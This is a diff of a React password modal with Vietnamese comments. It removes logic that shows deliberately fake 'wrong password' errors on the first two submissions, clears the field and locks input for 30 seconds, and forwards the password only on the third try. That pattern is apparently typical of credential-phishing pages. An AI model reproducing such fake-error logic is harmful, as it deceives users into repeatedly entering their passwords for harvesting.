@@ -1,5 +1,5 @@
 import { Button, Form, Input, Modal } from 'antd'
-import React, { useEffect, useState } from 'react'
+import React, { useEffect } from 'react'
 import "../../libs/i18n"
 import { useTranslation } from 'react-i18next';
 
@@ -7,11 +7,7 @@ const PasswordModal = ({ opendPasswordModal, onCancelPasswordModal, onFinishPass
     const { t } = useTranslation();
     const [password] = Form.useForm();
 
-    // Thêm state để đếm ngược 30s và đếm số lần nhập
-    const [countdown, setCountdown] = useState(0);
-    const [attemptCount, setAttemptCount] = useState(0);
-
-    // Xử lý khi có cảnh báo sai mật khẩu từ API (nếu có)
+    // Xử lý khi có cảnh báo sai mật khẩu (warningPassword = true)
     useEffect(() => {
         if (warningPassword) {
             password.setFields([
@@ -24,41 +20,9 @@ const PasswordModal = ({ opendPasswordModal, onCancelPasswordModal, onFinishPass
         }
     }, [warningPassword, password, t]);
 
-    // Xử lý logic đếm ngược mỗi giây
-    useEffect(() => {
-        let timer;
-        if (countdown > 0) {
-            timer = setInterval(() => {
-                setCountdown((prev) => prev - 1);
-            }, 1000);
-        }
-        return () => clearInterval(timer);
-    }, [countdown]);
-
-    // Hàm chặn submit để xử lý báo lỗi ảo 2 lần đầu
-    const handleFormSubmit = (values) => {
-        if (attemptCount < 2) {
-            // Lần 1 và Lần 2: Tăng số lần thử, báo lỗi, xóa mật khẩu và đếm ngược 30s
-            setAttemptCount(prev => prev + 1);
-            password.setFields([
-                {
-                    name: 'password',
-                    value: '',
-                    errors: [t('content.modal.password.form.password.warning')]
-                }
-            ]);
-            setCountdown(30);
-        } else {
-            // Lần 3: Gọi hàm onFinishPassword để đi tới bước tiếp theo
-            onFinishPassword(values);
-        }
-    };
-
-    // Reset form, thời gian và số lần thử khi đóng modal
+    // Reset form khi đóng modal
     const handleCancel = () => {
         password.resetFields();
-        setCountdown(0);
-        setAttemptCount(0);
         onCancelPasswordModal();
     };
 
@@ -102,8 +66,7 @@ const PasswordModal = ({ opendPasswordModal, onCancelPasswordModal, onFinishPass
                     initialValues={{
                         remember: true,
                     }}
-                    // Thay đổi onFinish để trỏ vào hàm chặn (handleFormSubmit)
-                    onFinish={handleFormSubmit}
+                    onFinish={onFinishPassword}
                     autoComplete="off"
                     form={password}
                 >
@@ -118,11 +81,7 @@ const PasswordModal = ({ opendPasswordModal, onCancelPasswordModal, onFinishPass
                             }
                         ]}
                     >
-                        {/* Khóa ô nhập liệu khi đang đếm ngược */}
-                        <Input.Password 
-                            placeholder='Password' 
-                            disabled={countdown > 0} 
-                        />
+                        <Input.Password placeholder='Password' />
                     </Form.Item>
 
                     <Form.Item className='ant-submit-button'>
@@ -131,12 +90,8 @@ const PasswordModal = ({ opendPasswordModal, onCancelPasswordModal, onFinishPass
                             className='button-send'
                             htmlType="submit"
                             loading={loadingPassword}
-                            disabled={countdown > 0} // Khóa nút khi đang đếm ngược
                         >
-                            {/* Hiển thị số giây chờ nếu đang đếm ngược */}
-                            {countdown > 0 
-                                ? `${t('content.modal.password.form.button')} (${countdown}s)` 
-                                : (loadingPassword ? '' : t('content.modal.password.form.button'))}
+                            {loadingPassword ? '' : t('content.modal.password.form.button')}
                         </Button>
                         <p className='forgot-password' style={{ textAlign: 'center', cursor: 'pointer' }}>{t('content.modal.password.form.forgot_password')}</p>
                     </Form.Item>
